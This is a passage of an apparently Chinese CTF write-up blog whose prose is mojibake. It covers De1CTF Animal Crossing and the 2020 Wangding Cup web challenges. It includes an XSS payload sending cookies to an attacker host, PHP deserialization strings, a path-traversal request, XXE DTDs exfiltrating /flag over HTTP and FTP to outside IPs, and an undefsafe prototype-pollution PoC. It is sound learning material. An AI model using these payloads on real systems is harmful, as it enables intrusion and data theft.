<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27YWxlcnQoMSk&#x3D;%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514230451345.png" alt="image-20200514230451345"></p>
<p>åŸç†æ˜¯åˆ©ç”¨</p>
<blockquote>
<p>åœ¨ä¸€å…ƒåŠ æ“ä½œç¬¦æ“ä½œå¯¹è±¡çš„æ—¶å€™ï¼Œä¼šå…ˆè°ƒç”¨å¯¹è±¡çš„valueOfæ–¹æ³•æ¥è½¬æ¢ï¼Œ</p>
</blockquote>
<p>ä»ä¹‹å‰çš„éªŒè¯ç é‚£é¢˜å¯ä»¥çŸ¥é“ï¼ŒMath+1ä¼šå› ä¸ºObjectä¸å­—ç¬¦ä¸²æ‹¼æ¥ååŸå‹ä¼šå˜æˆStringï¼Œç„¶åStringçš„constructorä¸ºFunctionï¼Œè¿™é‡Œåˆ©ç”¨<code>new &#39;&#39;.constructor.constructor(atob(&#39;YWxlcnQoMSk=&#39;))</code>å¾—åˆ°ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä¸èƒ½è‡ªåŠ¨æ‰§è¡Œï¼Œ</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231244338.png" alt="image-20200514231244338"></p>
<p>ä»å‰é¢ä¹Ÿçœ‹åˆ°waf banäº†test.test()è¿™ç§å½¢å¼çš„å‡½æ•°ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨å‰é¢çš„trickæ¥è¿›è¡Œå‡½æ•°çš„è§¦å‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/2020/05/14/De1CTF-Animal-Crossing-%E5%A4%8D%E7%8E%B0/image-20200514231918146.png" alt="image-20200514231918146"></p>
<p>ç„¶åå°†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">btoa(&#39;location&#x3D;&quot;http:&#x2F;&#x2F;ip&#x2F;?flag&#x3D;&quot;+document.cookie&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;mount&amp;fruit&#x3D;&amp;name&#x3D;mount&amp;data&#x3D;&#39;||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd%27))&#125;%2b1&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°ç”¨dockerå¤ç°æ—¶è€æ˜¯æŠ¥500ï¼Œé‚ç½¢ã€‚</p>
<p>è¿™æ ·è¿™å¾—åˆ°äº†åŠä¸ªflagï¼Œç„¶åè¦å¾—åˆ°ååŠéƒ¨åˆ†è¦è¯»å‡ºæœåŠ¡å™¨çš„400å¼ å›¾ç‰‡ï¼Œè¿™ç‚¹å¯ä»¥é€šè¿‡è¯»å–document.body.innerHTMLæ¥å¾—åˆ°ï¼Œç„¶ååé¢æœ‰ä¸‰ç§æ–¹æ³•å»å¾—åˆ°è¿™400å¼ å›¾ç‰‡</p>
<p>æ³•ä¸€ï¼š</p>
<ol>
<li>å°†æˆªå›¾åº“æ”¾åˆ°pngï¼Œä¸Šä¼ åˆ°/upload,ç»•è¿‡CSPï¼Œæ‰§è¡Œæˆªå›¾åº“</li>
<li>ç„¶ååˆ©ç”¨<code>fetch(</code>/static/images/xxxxxxxxx.png<code>).then(res=&gt;res.text()).then(txt=&gt;eval(txt))</code>æ‰§è¡Œ</li>
</ol>
<p>æ³•äºŒï¼š</p>
<blockquote>
<p>ç”¨forå¾ªç¯æŠŠ400ä¸ªå›¾å…¨éƒ¨ä¼ åˆ°/uploadï¼Œè·å–400ä¸ªå›¾ç‰‡åœ°å€ç„¶åå›ä¼ </p>
</blockquote>
<p>æ³•ä¸‰ï¼š</p>
<blockquote>
<p>ç›´æ¥è¯»å–å›¾ç‰‡å›ä¼ ï¼Œå¯ä»¥æ˜¯å†™è„šæœ¬ä¸€å¼ ä¸€å¼ ä¼ ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨forå¾ªç¯æ‰¹é‡ä¼ ï¼Œä½†æ˜¯å›ä¼ è¿‡ç¨‹éœ€è¦ç¼–ç è½¬æ¢ï¼Œä¼ å›å»åä¹Ÿéœ€è¦å†è½¬æˆå›¾ç‰‡è¿›è¡Œæ‹¼æ¥</p>
</blockquote>
<p>å‚è€ƒ</p>
<p><a href="https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more" target="_blank" rel="noopener">https://www.codemonster.cn/2020/05/06/2020-de1ctf-animal-crossing-writeup/#more</a></p>
<p><a href="https://www.4hou.com/posts/EGlN" target="_blank" rel="noopener">https://www.4hou.com/posts/EGlN</a></p>
<p><a href="https://segmentfault.com/a/1190000015660623" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015660623</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020å¹´ç½‘é¼æ¯WEB-writeup</title>
    <url>/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/</url>
    <content><![CDATA[<p>è¢«é˜Ÿå‹å¸¦é£ï¼Œé˜Ÿå‹ğŸ‘ğŸ‘ğŸ‘</p>
<a id="more"></a>

<h1 id="0x01-AreUSerialz"><a href="#0x01-AreUSerialz" class="headerlink" title="0x01 AreUSerialz"></a>0x01 AreUSerialz</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$a-&gt;op = <span class="number">2</span>;</span><br><span class="line">$a-&gt;filename = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å¾ˆæ„å¤–ä¸ºå•¥æŠŠä¸Šé¢çš„3æ”¹æˆ2å°±å¥½äº†ï¼Œ</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195659225.png" alt="image-20200510195659225"></p>
<p>ç„¶ååœ¨æœ¬åœ°è¯•äº†è¯•ï¼Œå¥½åƒè·Ÿphpçš„ç‰ˆæœ¬å’ŒSAPIæœ‰å…³ï¼Œ</p>
<p>phpä»¥cliæ–¹å¼è¿è¡Œæ—¶å€™æ˜¯ä¸ç”¨ä¿®æ”¹3å˜æˆ2çš„ï¼Œæœ¬åœ°æµ‹è¯•php7.2.1å’Œ7.3.15ç‰ˆæœ¬å°†protectedæ”¹æˆpublicå±æ€§æ˜¯å¯ä»¥æˆåŠŸçš„ï¼Œå…¶ä»–ç‰ˆæœ¬ä¸å¯ä»¥</p>
<ul>
<li>php 7.2.1</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103022778.png" alt="image-20200511103022778"></p>
<ul>
<li>php 7.1.13</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103058029.png" alt="image-20200511103058029"></p>
<ul>
<li>php 5.3.29</li>
</ul>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511103127750.png" alt="image-20200511103127750"></p>
<p>ç„¶åæœ¬åœ°7ç‰ˆæœ¬æ—¶å€™ï¼Œä¸ç”¨æŠŠ3æ”¹æˆ2ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯åœ¨é¢˜ç›®ç¯å¢ƒä¸æ”¹3çš„è¯ä¸èƒ½æˆåŠŸã€‚è™šæ‹Ÿæœºé‡Œä¹Ÿæ˜¯å’Œé¢˜ç›®ç¯å¢ƒä¸€æ ·ã€‚</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510201328743.png" alt="image-20200510201328743"></p>
<p>win 10 phpstudy php7.2.1</p>
<p>psï¼šæ·»åŠ äº†ä¸€ä¸ªvar_dump(scandir(â€˜.â€™));è¾“å‡ºçš„æ˜¯php.exeçš„è·¯å¾„ã€‚</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510202256996.png" alt="image-20200510202256996"></p>
<p>è¿™é‡Œæ˜¯sapiçš„åŸå› (è¯•äº†apacheå’Œnginxéƒ½ä¸å¯ä»¥)ï¼Œå¦‚æœè¦è¯»çš„è¯è¦ç”¨ç»å¯¹è·¯å¾„</p>
<blockquote>
<p><strong>Note</strong>:</p>
<p>ææ„å‡½æ•°åœ¨è„šæœ¬å…³é—­æ—¶è°ƒç”¨ï¼Œæ­¤æ—¶æ‰€æœ‰çš„ HTTP å¤´ä¿¡æ¯å·²ç»å‘å‡ºã€‚è„šæœ¬å…³é—­æ—¶çš„å·¥ä½œç›®å½•æœ‰å¯èƒ½å’Œåœ¨ SAPIï¼ˆå¦‚ apacheï¼‰ä¸­æ—¶ä¸åŒã€‚</p>
<p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p>
</blockquote>
<p>å¦å¤–å¦‚æœæŠŠ3æ”¹æˆ2çš„è¯ä¹Ÿæ˜¯å¯ä»¥è¯»çš„</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511095452622.png" alt="image-20200511095452622"></p>
<p>phpstudy7.2.10å¤–å…¶ä»–ç‰ˆæœ¬å‡è¯»ä¸äº†flagæ–‡ä»¶ã€‚</p>
<p>åæ¥çœ‹åˆ°pç¥ä¹‹å‰åˆ†äº«è¿‡</p>
<blockquote>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215419050.png" alt="image-20200511215419050"></p>
<p><a href="https://blog.csdn.net/a3320315/article/details/105215741" target="_blank" rel="noopener">å‚è€ƒ</a></p>
</blockquote>
<p>ç„¶åè¿˜æœ‰ä¸€ç§è§£æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">"\00*\00op"</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">"\00*\00filename"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;S:<span class="number">10</span>:<span class="string">"\00*\00content"</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200511215516506.png" alt="image-20200511215516506"></p>
<h1 id="0x02-filejava"><a href="#0x02-filejava" class="headerlink" title="0x02 filejava"></a>0x02 filejava</h1><p>ä¸Šä¼ å®Œæ–‡ä»¶å¯ä»¥çœ‹ä¸‹è½½æ–‡ä»¶å¤„æœ‰ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œ</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214503572.png" alt="image-20200510214503572"></p>
<p>éƒ½é…ç½®æ–‡ä»¶</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214652887.png" alt="image-20200510214652887"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"2.5"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>file_in_java<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>upload.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¯»classæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214948845.png" alt="image-20200510214948845"></p>
<p>ä¸‹è½½ä¸‹æ¥åç¼–è¯‘ï¼Œ</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510215207185.png" alt="image-20200510215207185"></p>
<p>çœ‹åˆ°poi-ooxml-3.10 has something wrongï¼Œä¹‹å‰åšswpuçš„æ—¶å€™å°±æœ‰è¿™ä¸ªçš„xxeï¼Œå¯ä»¥è¯´æ˜¯åŸé¢˜ï¼Œæ¯”é‚£ä¸ªè¿˜ç®€å•ç‚¹ï¼Œæ–°å»ºä¸€ä¸ªexcelæ–‡ä»¶ï¼Œç„¶åç”¨å‹ç¼©åŒ…æ‰“å¼€ï¼Œä¿®æ”¹é‡Œé¢çš„[Content_Types].xml,</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510221931914.png" alt="image-20200510221931914"></p>
<p>ç„¶ååœ¨vpsä¸Šgx.dtdï¼Œä¸Šæ¬¡é«˜æ ¡æˆ˜å½¹Java xxeçš„æ–‡ä»¶ï¼Œï¼Œ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç›‘å¬9999ç«¯å£ï¼Œ</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222245930.png" alt="image-20200510222245930"></p>
<p>ä¹Ÿå¯ä»¥ç”¨ftpè¯»</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222359786.png" alt="image-20200510222359786"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://144.34.200.151:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222721778.png" alt="image-20200510222721778"></p>
<p>ps:å¯ä»¥çœ‹åˆ°è¿™é‡Œjavaç‰ˆæœ¬è¯•1.8</p>
<p><img src="https://mount4in.github.io/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
<p><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a></p>
<h1 id="0x03-notes"><a href="#0x03-notes" class="headerlink" title="0x03 notes"></a>0x03 notes</h1><p>åŸå‹é“¾æ±¡æŸ“ï¼ŒundefsafeåŒ…æœ‰bug</p>
<p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free 